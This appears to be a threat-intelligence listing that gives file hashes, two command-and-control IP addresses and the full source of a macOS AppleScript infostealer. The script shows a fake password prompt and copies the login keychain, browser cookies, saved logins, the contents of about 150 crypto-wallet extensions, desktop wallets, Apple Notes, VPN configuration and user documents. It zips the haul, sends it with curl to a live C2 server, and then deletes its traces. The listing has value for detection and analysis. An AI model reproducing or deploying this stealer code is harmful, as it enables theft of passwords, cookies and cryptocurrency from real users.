@@ -1,0 +1,409 @@
+Files:
+
+7b8e40ef5c0fdf8006521b56e1f28ee4
+b088b0dd1779d4ef065ac690666aa2e9
+583e553ec22ff9475249673e51313311
+ba96a32a84a857265edb61672f114d61
+20831410d7d2b6ac528db710d6289f54
+66f25b401ce26339e7d1e49cbbbd3ec9
+9ad0bf79843d18419e8fc022ed76faf8
+b58af6964970fe4cda2b4d6ea50cdb90
+ba3bbb1b6284de5aaccf851634710af6
+24027d8884fa57f3cae435d717298f73
+0faa7840d5aedd91b23a9574d2ccd31e
+0502687d1ae53401d087cbaef3d9c8bf
+cbb4d95fef59ac63303d9ca1c2385ec9
+2dd8270deb721819f7e354b49c88c9c7
+e4f3c4f0ec0c6575c0d239f7c220afa2
+a6e4312e1c25286a937b1cb8dfbf6d24
+5224e58f806c2666b2fdeaf589e8ce02
+98759d31044134368714f9bc6e9d18f9
+de90ff66a374c1be67786b843feca416
+7f96f26a76a4e2696fd4a7cbd7c5223d
+77f38f74f43a731a80ff4febcc81c40e
+78b925690d3fc0ed1742fbcda36d86b1
+b2b2cf194a0f5b7b85c1ea3769cdc0eb
+133602ae926aa16e652dd88eb6d1c278
+a035529d2a3b32ea3f5d59ced5eda17b
+02beb5660da5157700966b88c236d869
+cbf689f4ea60256b332c1950af782eb2
+f899ee68a9c8583f0e5329af2f313e4d
+416b4cf6f63c689474645a76f8bc8ae4
+dd1c76dad2d178db668d8d29b8a9d77c
+4ef31da0b49816d32fe88929fae7b8c8
+323c1fd0e6da847254febb4d94d90f2f
+7b19cb84facfcf492bd84df5689cd724
+d61a298692315f0033172cd93c1ec2e1
+930be3c00bd5c7c279a09550b74e539a
+539c9c2181542d5ae4ecee1eea71066f
+f45ec1f2be68488c62d2e4435687556b
+b8221b7c04b887e11e73f0e632f21c01
+a21dc35b319b0a2c6f798c518ec4bf4b
+543046838771fae51c120d3c8538e0b9
+e408f38aa05160d480d14f3163546a14
+dd50077310cd466eca4699337b5e07f9
+4ff86da2690e34053574e2c22ed8f493
+edff3da8bec2d2c1f2d393eca6daff8b
+e479593d8487635c86ff5fbb9b1d4421
+0a7642bd3cacb5f6ddf91e0dd0359a23
+29da7836949c717b402ad8fa600b32f4
+
+C2:
+
+45.93.20[.]174
+79.137.192[.]4
+
+osascript:
+
+osascript -e 'set release to true
+set filegrabbers to true
+on filesizer(paths)
+	set fsz to 0
+	try
+		set theItem to quoted form of POSIX path of paths
+		set fsz to (do shell script "/usr/bin/mdls -name kMDItemFSSize -raw " & theItem)
+	end try
+	return fsz
+end filesizer
+on mkdir(someItem)
+	try
+		set filePosixPath to quoted form of (POSIX path of someItem)
+		do shell script "mkdir -p " & filePosixPath
+	end try
+end mkdir
+on FileName(filePath)
+	try
+		set reversedPath to (reverse of every character of filePath) as string
+		set trimmedPath to text 1 thru ((offset of "/" in reversedPath) - 1) of reversedPath
+		set finalPath to (reverse of every character of trimmedPath) as string
+		return finalPath
+	end try
+end FileName
+on BeforeFileName(filePath)
+	try
+		set lastSlash to offset of "/" in (reverse of every character of filePath) as string
+		set trimmedPath to text 1 thru -(lastSlash + 1) of filePath
+		return trimmedPath
+	end try
+end BeforeFileName
+on writeText(textToWrite, filePath)
+	try
+		set folderPath to BeforeFileName(filePath)
+		mkdir(folderPath)
+		set fileRef to (open for access filePath with write permission)
+		write textToWrite to fileRef starting at eof
+		close access fileRef
+	end try
+end writeText
+on readwrite(path_to_file, path_as_save)
+	try
+		set fileContent to read path_to_file
+		set folderPath to BeforeFileName(path_as_save)
+		mkdir(folderPath)
+		do shell script "cat " & quoted form of path_to_file & " > " & quoted form of path_as_save
+	end try
+end readwrite
+on isDirectory(someItem)
+	try
+		set filePosixPath to quoted form of (POSIX path of someItem)
+		set fileType to (do shell script "file -b " & filePosixPath)
+		if fileType ends with "directory" then
+			return true
+		end if
+		return false
+	end try
+end isDirectory
+on GrabFolderLimit(sourceFolder, destinationFolder)
+	try
+		set bankSize to 0
+		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
+		set fileList to list folder sourceFolder without invisibles
+		mkdir(destinationFolder)
+		repeat with currentItem in fileList
+			if currentItem is not in exceptionsList then
+				set itemPath to sourceFolder & "/" & currentItem
+				set savePath to destinationFolder & "/" & currentItem
+				if isDirectory(itemPath) then
+					GrabFolderLimit(itemPath, savePath)
+				else
+					set fsz to filesizer(itemPath)
+					set bankSize to bankSize + fsz
+					if bankSize < 210 * 1024 * 1024 then
+						readwrite(itemPath, savePath)
+					end if
+				end if
+			end if
+		end repeat
+	end try
+end GrabFolderLimit
+on GrabFolder(sourceFolder, destinationFolder)
+	try
+		set exceptionsList to {".DS_Store", "Partitions", "Code Cache", "Cache", "market-history-cache.json", "journals", "Previews"}
+		set fileList to list folder sourceFolder without invisibles
+		mkdir(destinationFolder)
+		repeat with currentItem in fileList
+			if currentItem is not in exceptionsList then
+				set itemPath to sourceFolder & "/" & currentItem
+				set savePath to destinationFolder & "/" & currentItem
+				if isDirectory(itemPath) then
+					GrabFolder(itemPath, savePath)
+				else
+					readwrite(itemPath, savePath)
+				end if
+			end if
+		end repeat
+	end try
+end GrabFolder
+on GetUUID(pather, searchString)
+	try
+		set theFile to POSIX file pather
+		set fileContents to read theFile
+		set startPos to offset of searchString in fileContents
+		if startPos is 0 then
+			return "not found"
+		end if
+		set uuidStart to startPos + (length of searchString)
+		set uuid to text uuidStart thru (uuidStart + 55) of fileContents
+		set endpos to offset of "\\" in uuid
+		if endpos is 0 then
+			return "not found"
+		end if
+		set realuuid to text uuidStart thru (uuidStart + endpos - 2) of fileContents
+		return realuuid
+	on error
+		return "not found"
+	end try
+end GetUUID
+on firewallets(firepath, writemind, profile)
+	try
+		set fire_wallets to {{"MetaMask", "webextension@metamask.io\\\":\\\""}}
+		repeat with wallet in fire_wallets
+			set uuid to GetUUID(firepath & "/prefs.js", item 2 of wallet)
+			if uuid is not "not found" then
+				set walkpath to firepath & "/storage/default/"
+				set fileList to list folder walkpath without invisibles
+				repeat with currentItem in fileList
+					if currentItem contains uuid then
+						set fwallet to walkpath & currentItem & "/idb/"
+						set fileList_wallet to list folder fwallet without invisibles
+						repeat with currentItem_wallet in fileList_wallet
+							if isDirectory(fwallet & currentItem_wallet) then
+								GrabFolder(fwallet & currentItem_wallet, writemind & "ffwallets/" & item 1 of wallet & "_" & profile & "/")
+							end if
+						end repeat
+					end if
+				end repeat
+			end if
+		end repeat
+	end try
+end firewallets
+on parseFF(firefox, writemind)
+	try
+		set myFiles to {"/cookies.sqlite", "/formhistory.sqlite", "/key4.db", "/logins.json"}
+		set fileList to list folder firefox without invisibles
+		repeat with currentItem in fileList
+			firewallets(firefox & currentItem, writemind, currentItem)
+			set fpath to writemind & "ff/" & currentItem
+			set readpath to firefox & currentItem
+			repeat with FFile in myFiles
+				readwrite(readpath & FFile, fpath & FFile)
+			end repeat
+		end repeat
+	end try
+end parseFF
+on checkvalid(username, password_entered)
+	try
+		set result to do shell script "dscl . authonly " & quoted form of username & space & quoted form of password_entered
+		if result is not equal to "" then
+			return false
+		else
+			return true
+		end if
+	on error
+		return false
+	end try
+end checkvalid
+on getpwd(username, writemind)
+	try
+		if checkvalid(username, "") then
+			set result to do shell script "security 2>&1 > /dev/null find-generic-password -ga \"Chrome\" | awk \"{print $2}\""
+			writeText(result as string, writemind & "masterpass-chrome")
+		else
+			repeat
+				set result to display dialog "Required Application Helper. Please enter password for continue." default answer "" with icon caution buttons {"Continue"} default button "Continue" giving up after 150 with title "Application wants to install helper" with hidden answer
+				set password_entered to text returned of result
+				if checkvalid(username, password_entered) then
+					writeText(password_entered, writemind & "pwd")
+					return password_entered
+				end if
+			end repeat
+		end if
+	end try
+	return ""
+end getpwd
+on grabPlugins(paths, savePath, pluginList, index)
+	try
+		set fileList to list folder paths without invisibles
+		repeat with PFile in fileList
+			repeat with Plugin in pluginList
+				if (PFile contains Plugin) then
+					set newpath to paths & PFile
+					set newsavepath to savePath & "/" & Plugin
+					if index then
+						set newsavepath to newsavepath & "/IndexedDB/"
+					end if
+					GrabFolder(newpath, newsavepath)
+				end if
+			end repeat
+		end repeat
+	end try
+end grabPlugins
+on chromium(writemind, chromium_map)
+	set pluginList to {"keenhcnmdmjjhincpilijphpiohdppno", "hbbgbephgojikajhfbomhlmmollphcad", "cjmkndjhnagcfbpiemnkdpomccnjblmj", "dhgnlgphgchebgoemcjekedjjbifijid", "hifafgmccdpekplomjjkcfgodnhcellj", "kamfleanhcmjelnhaeljonilnmjpkcjc", "jnldfbidonfeldmalbflbmlebbipcnle", "fdcnegogpncmfejlfnffnofpngdiejii", "klnaejjgbibmhlephnhpmaofohgkpgkd", "pdadjkfkgcafgbceimcpbkalnfnepbnk", "kjjebdkfeagdoogagbhepmbimaphnfln", "ldinpeekobnhjjdofggfgjlcehhmanlj", "dkdedlpgdmmkkfjabffeganieamfklkm", "bcopgchhojmggmffilplmbdicgaihlkp", "kpfchfdkjhcoekhdldggegebfakaaiog", "idnnbdplmphpflfnlkomgpfbpcgelopg", "mlhakagmgkmonhdonhkpjeebfphligng", "bipdhagncpgaccgdbddmbpcabgjikfkn", "gcbjmdjijjpffkpbgdkaojpmaninaion", "nhnkbkgjikgcigadomkphalanndcapjk", "bhhhlbepdkbapadjdnnojkbgioiodbic", "hoighigmnhgkkdaenafgnefkcmipfjon", "klghhnkeealcohjjanjjdaeeggmfmlpl", "nkbihfbeogaeaoehlefnkodbefgpgknn", "fhbohimaelbohpjbbldcngcnapndodjp", "ebfidpplhabeedpnhjnobghokpiioolj", "emeeapjkbcbpbpgaagfchmcgglmebnen", "fldfpgipfncgndfolcbkdeeknbbbnhcc", "penjlddjkjgpnkllboccdgccekpkcbin", "fhilaheimglignddkjgofkcbgekhenbh", "hmeobnfnfcmdkdcmlblgagmfpfboieaf", "cihmoadaighcejopammfbmddcmdekcje", "lodccjjbdhfakaekdiahmedfbieldgik", "omaabbefbmiijedngplfjmnooppbclkk", "cjelfplplebdjjenllpjcblmjkfcffne", "jnlgamecbpmbajjfhmmmlhejkemejdma", "fpkhgmpbidmiogeglndfbkegfdlnajnf", "bifidjkcdpgfnlbcjpdkdcnbiooooblg", "amkmjjmmflddogmhpjloimipbofnfjih", "flpiciilemghbmfalicajoolhkkenfel", "hcflpincpppdclinealmandijcmnkbgn", "aeachknmefphepccionboohckonoeemg", "nlobpakggmbcgdbpjpnagmdbdhdhgphk", "momakdpclmaphlamgjcndbgfckjfpemp", "mnfifefkajgofkcjkemidiaecocnkjeh", "fnnegphlobjdpkhecapkijjdkgcjhkib", "ehjiblpccbknkgimiflboggcffmpphhp", "ilhaljfiglknggcoegeknjghdgampffk", "pgiaagfkgcbnmiiolekcfmljdagdhlcm", "fnjhmkhhmkbjkkabndcnnogagogbneec", "bfnaelmomeimhlpmgjnjophhpkkoljpa", "imlcamfeniaidioeflifonfjeeppblda", "mdjmfdffdcmnoblignmgpommbefadffd", "ooiepdgjjnhcmlaobfinbomgebfgablh", "pcndjhkinnkaohffealmlmhaepkpmgkb", "ppdadbejkmjnefldpcdjhnkpbjkikoip", "cgeeodpfagjceefieflmdfphplkenlfk", "dlcobpjiigpikoobohmabehhmhfoodbb", "jiidiaalihmmhddjgbnbgdfflelocpak", "bocpokimicclpaiekenaeelehdjllofo", "pocmplpaccanhmnllbbkpgfliimjljgo", "cphhlgmgameodnhkjdmkpanlelnlohao", "mcohilncbfahbmgdjkbpemcciiolgcge", "bopcbmipnjdcdfflfgjdgdjejmgpoaab", "khpkpbbcccdmmclmpigdgddabeilkdpd", "ejjladinnckdgjemekebdpeokbikhfci", "phkbamefinggmakgklpkljjmgibohnba", "epapihdplajcdnnkdeiahlgigofloibg", "hpclkefagolihohboafpheddmmgdffjm", "cjookpbkjnpkmknedggeecikaponcalb", "cpmkedoipcpimgecpmgpldfpohjplkpp", "modjfdjcodmehnpccdjngmdfajggaoeh", "ibnejdfjmmkpcnlpebklmnkoeoihofec", "afbcbjpbpfadlkmhmclhkeeodmamcflc", "kncchdigobghenbbaddojjnnaogfppfj", "efbglgofoippbgcjepnhiblaibcnclgk", "mcbigmjiafegjnnogedioegffbooigli", "fccgmnglbhajioalokbcidhcaikhlcpm", "hnhobjmcibchnmglfbldbfabcgaknlkj", "apnehcjmnengpnmccpaibjmhhoadaico", "enabgbdfcbaehmbigakijjabdpdnimlg", "mgffkfbidihjpoaomajlbgchddlicgpn", "fopmedgnkfpebgllppeddmmochcookhc", "jojhfeoedkpkglbfimdfabpdfjaoolaf", "ammjlinfekkoockogfhdkgcohjlbhmff", "abkahkcbhngaebpcgfmhkoioedceoigp", "dcbjpgbkjoomeenajdabiicabjljlnfp", "gkeelndblnomfmjnophbhfhcjbcnemka", "pnndplcbkakcplkjnolgbkdgjikjednm", "copjnifcecdedocejpaapepagaodgpbh", "hgbeiipamcgbdjhfflifkgehomnmglgk", "mkchoaaiifodcflmbaphdgeidocajadp", "ellkdbaphhldpeajbepobaecooaoafpg", "mdnaglckomeedfbogeajfajofmfgpoae", "nknhiehlklippafakaeklbeglecifhad", "ckklhkaabbmdjkahiaaplikpdddkenic", "fmblappgoiilbgafhjklehhfifbdocee", "nphplpgoakhhjchkkhmiggakijnkhfnd", "cnmamaachppnkjgnildpdmkaakejnhae", "fijngjgcjhjmmpcmkeiomlglpeiijkld", "niiaamnmgebpeejeemoifgdndgeaekhe", "odpnjmimokcmjgojhnhfcnalnegdjmdn", "lbjapbcmmceacocpimbpbidpgmlmoaao", "hnfanknocfeofbddgcijnmhnfnkdnaad", "hpglfhgfnhbgpjdenjgmdgoeiappafln", "egjidjbpglichdcondbcbdnbeeppgdph", "ibljocddagjghmlpgihahamcghfggcjc", "gkodhkbmiflnmkipcmlhhgadebbeijhh", "dbgnhckhnppddckangcjbkjnlddbjkna", "mfhbebgoclkghebffdldpobeajmbecfk", "nlbmnnijcnlegkjjpcfjclmcfggfefdm", "nlgbhdfgdhgbiamfdfmbikcdghidoadd", "acmacodkjbdgmoleebolmdjonilkdbch", "agoakfejjabomempkjlepdflaleeobhb", "dgiehkgfknklegdhekgeabnhgfjhbajd", "onhogfjeacnfoofkfgppdlbmlmnplgbn", "kkpehldckknjffeakihjajcjccmcjflh", "jaooiolkmfcmloonphpiiogkfckgciom", "ojggmchlghnjlapmfbnjholfjkiidbch", "pmmnimefaichbcnbndcfpaagbepnjaig", "oiohdnannmknmdlddkdejbmplhbdcbee", "aiifbnbfobpmeekipheeijimdpnlpgpp", "aholpfdialjgjfhomihkjbmgjidlcdno", "anokgmphncpekkhclmingpimjmcooifb", "kkpllkodjeloidieedojogacfhpaihoh", "iokeahhehimjnekafflcihljlcjccdbe", "ifckdpamphokdglkkdomedpdegcjhjdp", "loinekcabhlmhjjbocijdoimmejangoa", "fcfcfllfndlomdhbehjjcoimbgofdncg", "ifclboecfhkjbpmhgehodcjpciihhmif", "dmkamcknogkgcdfhhbddcghachkejeap", "ookjlbkiijinhpmnjffcofjonbfbgaoc", "oafedfoadhdjjcipmcbecikgokpaphjk", "mapbhaebnddapnmifbbkgeedkeplgjmf", "cmndjbecilbocjfkibfbifhngkdmjgog", "kpfopkelmapcoipemfendmdcghnegimn", "lgmpcpglpngdoalbgeoldeajfclnhafa", "ppbibelpcjmhbdihakflkdcoccbgbkpo", "ffnbelfdoeiohenkjibnmadjiehjhajb", "opcgpfmipidbgpenhmajoajpbobppdil", "lakggbcodlaclcbbbepmkpdhbcomcgkd", "kgdijkcfiglijhaglibaidbipiejjfdp", "hdkobeeifhdplocklknbnejdelgagbao", "lnnnmfcpbkafcpgdilckhmhbkkbpkmid", "nbdhibgjnjpnkajaghbffjbkcgljfgdi", "kmhcihpebfmpgmihbkipmjlmmioameka", "kmphdnilpmdejikjdnlbcnmnabepfgkh", "nngceckbapebfimnlniiiahkandclblb"}
+	set custom_plugin_list to {""}
+	set chromiumFiles to {"/Network/Cookies", "/Cookies", "/Web Data", "/Login Data", "/Local Extension Settings/", "/IndexedDB/"}
+	repeat with chromium in chromium_map
+		set savePath to writemind & "Chromium/" & item 1 of chromium & "_"
+		try
+			set fileList to list folder item 2 of chromium without invisibles
+			repeat with currentItem in fileList
+				if ((currentItem as string) is equal to "Default") or ((currentItem as string) contains "Profile") then
+					repeat with CFile in chromiumFiles
+						set readpath to (item 2 of chromium & currentItem & CFile)
+						if ((CFile as string) is equal to "/Network/Cookies") then
+							set CFile to "/Cookies"
+						end if
+						if ((CFile as string) is equal to "/Local Extension Settings/") then
+							grabPlugins(readpath, savePath & currentItem, pluginList, false)
+							grabPlugins(readpath, writemind & "deskwallets/", custom_plugin_list, false)
+						else if (CFile as string) is equal to "/IndexedDB/" then
+							grabPlugins(readpath, savePath & currentItem, pluginList, true)
+						else
+							set writepath to savePath & currentItem & CFile
+							readwrite(readpath, writepath)
+						end if
+					end repeat
+				end if
+			end repeat
+		end try
+	end repeat
+end chromium
+on deskwallets(writemind, deskwals)
+	repeat with deskwal in deskwals
+		try
+			GrabFolder(item 2 of deskwal, writemind & item 1 of deskwal)
+		end try
+	end repeat
+end deskwallets
+on filegrabber()
+	try
+		set destinationFolderPath to POSIX file "/tmp/xuyna/FileGrabber/"
+		set photosPath to POSIX file "/tmp/photos"
+		mkdir(photosPath)
+		mkdir(destinationFolderPath)
+		set extensionsList to {"txt","pdf","docx","zip","wallet","key","keys","doc","jpeg","png"}
+		set bankSize to 0
+		tell application "Finder"
+			try
+				set safariFolderPath to (path to home folder as text) & "Library:Cookies:"
+				duplicate file (safariFolderPath & "Cookies.binarycookies") to folder destinationFolderPath with replacing
+				set name of result to "saf1"
+			end try
+			try
+				set safariFolder to ((path to library folder from user domain as text) & "Containers:com.apple.Safari:Data:Library:Cookies:")
+				try
+					duplicate file "Cookies.binarycookies" of folder safariFolder to folder destinationFolderPath with replacing
+				end try
+				set notesFolderPath to (path to home folder as text) & "Library:Group Containers:group.com.apple.notes:"
+				set notesAccounts to folder (notesFolderPath & "Accounts:")
+				try
+					--duplicate notesAccounts to photosPath with replacing
+				end try
+				try
+					set notesFolder to folder notesFolderPath
+					set notesFiles to {file "NoteStore.sqlite", file "NoteStore.sqlite-shm", file "NoteStore.sqlite-wal"} of notesFolder
+					repeat with aFile in notesFiles
+						try
+							duplicate aFile to folder destinationFolderPath with replacing
+						end try
+					end repeat
+				end try
+			end try
+			try
+				set desktopFiles to every file of desktop
+				set documentsFiles to every file of folder "Documents" of (path to home folder)
+				set downloadsFiles to every file of folder "Downloads" of (path to home folder)
+				repeat with aFile in (desktopFiles & documentsFiles & downloadsFiles)
+					set fileExtension to name extension of aFile
+					if fileExtension is in extensionsList then
+						set filesize to size of aFile
+						if (bankSize + filesize) < 10 * 1024 * 1024 then
+							try
+								duplicate aFile to folder destinationFolderPath with replacing
+								set bankSize to bankSize + filesize
+							end try
+						else
+							exit repeat
+						end if
+					end if
+				end repeat
+			end try
+		end tell
+	end try
+end filegrabber
+on send_data(attempt)
+ try
+  set result_send to (do shell script "curl -X POST -H \"uuid: eac4bf9bfd2748888c4a3c639f8c4936\" -H \"user: admin\" -H \"buildid: 1\" --data-binary @/tmp/out.zip http://45.93.20.174/p2p")
+ on error
+  if attempt < 10 then
+   delay 60
+   send_data(attempt + 1)
+  end if
+ end try
+end send_data
+on VPN(writemind, vpn_dirs)
+end VPN
+set username to (system attribute "USER")
+set profile to "/Users/" & username
+set writemind to "/tmp/xuyna/"
+try
+	set result to (do shell script "system_profiler SPSoftwareDataType SPHardwareDataType SPDisplaysDataType")
+	writeText(result, writemind & "user")
+end try
+set library to profile & "/Library/Application Support/"
+set password_entered to getpwd(username, writemind)
+delay 0.01
+set chromiumMap to {{"Chrome", library & "Google/Chrome/"}, {"Brave", library & "BraveSoftware/Brave-Browser/"}, {"Edge", library & "Microsoft Edge/"}, {"Vivaldi", library & "Vivaldi/"}, {"Opera", library & "com.operasoftware.Opera/"}, {"OperaGX", library & "com.operasoftware.OperaGX/"}, {"Chrome Beta", library & "Google/Chrome Beta/"}, {"Chrome Canary", library & "Google/Chrome Canary"}, {"Chromium", library & "Chromium/"}, {"Chrome Dev", library & "Google/Chrome Dev/"}}
+set walletMap to {{"deskwallets/Electrum", profile & "/.electrum/wallets/"}, {"deskwallets/Coinomi", library & "Coinomi/wallets/"}, {"deskwallets/Exodus", library & "Exodus/"}, {"deskwallets/Atomic", library & "atomic/Local Storage/leveldb/"}, {"deskwallets/Wasabi", profile & "/.walletwasabi/client/Wallets/"}, {"deskwallets/Ledger_Live", library & "Ledger Live/"}, {"deskwallets/Monero", profile & "/Monero/wallets/"}, {"deskwallets/Bitcoin_Core", library & "Bitcoin/wallets/"}, {"deskwallets/Litecoin_Core", library & "Litecoin/wallets/"}, {"deskwallets/Dash_Core", library & "DashCore/wallets/"}, {"deskwallets/Electrum_LTC", profile & "/.electrum-ltc/wallets/"}, {"deskwallets/Electron_Cash", profile & "/.electron-cash/wallets/"}, {"deskwallets/Guarda", library & "Guarda/"}, {"deskwallets/Dogecoin_Core", library & "Dogecoin/wallets/"}, {"deskwallets/Trezor_Suite", library & "@trezor/suite-desktop/"}}
+readwrite(library & "Binance/app-store.json", writemind & "deskwallets/Binance/app-store.json")
+readwrite(library & "@tonkeeper/desktop/config.json", "deskwallets/TonKeeper/config.json")
+readwrite(profile & "/Library/Keychains/login.keychain-db", writemind & "keychain")
+if release then
+	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite", writemind & "FileGrabber/NoteStore.sqlite")
+	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-wal", writemind & "FileGrabber/NoteStore.sqlite-wal")
+	readwrite(profile & "/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite-shm", writemind & "FileGrabber/NoteStore.sqlite-shm")
+	readwrite(profile & "/Library/Containers/com.apple.Safari/Data/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/Cookies.binarycookies")
+	readwrite(profile & "/Library/Cookies/Cookies.binarycookies", writemind & "FileGrabber/saf1")
+end if
+if filegrabbers then
+	filegrabber()
+end if
+writeText(username, writemind & "username")
+set ff_paths to {library & "Firefox/Profiles/", library & "Waterfox/Profiles/", library & "Pale Moon/Profiles/"}
+repeat with firefox in ff_paths
+	try
+		parseFF(firefox, writemind)
+	end try
+end repeat
+chromium(writemind, chromiumMap)
+deskwallets(writemind, walletMap)
+--GrabFolderLimit("/tmp/photos/", writemind & "FileGrabber/NotesPhoto/")
+--set vpns to {{"OpenVPN", library & "OpenVPN Connect/profiles/"}}
+readwrite("/Library/Application Support/Fortinet/FortiClient/conf/vpn.plist", writemind & "vpn/FortiVPN/vpn.plist") 
+do shell script "ditto -c -k --sequesterRsrc " & writemind & " /tmp/out.zip"
+send_data(0)
+do shell script "rm -r " & writemind
+do shell script "rm -r /tmp/photos"
+do shell script "rm /tmp/out.zip"
+
+' &
